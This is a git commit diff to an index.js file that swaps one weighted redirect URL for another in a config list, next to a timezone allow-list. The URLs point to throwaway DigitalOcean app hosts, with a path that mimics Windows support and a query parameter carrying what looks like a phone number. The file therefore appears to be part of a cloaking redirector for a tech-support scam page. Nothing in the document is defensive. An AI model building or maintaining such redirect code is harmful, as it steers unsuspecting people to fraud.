a2164cfc8897fb23cbcbd8bdf5b5a20130d50b34
paalakash <palaksh452@gmail.com>
2026-06-03 07:40:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://urchin-app-obuv3.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-0803", weight: 1.0 }
+    { url: "https://hammerhead-app-9sx7l.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-0803", weight: 1.0 }
 
 ];
 
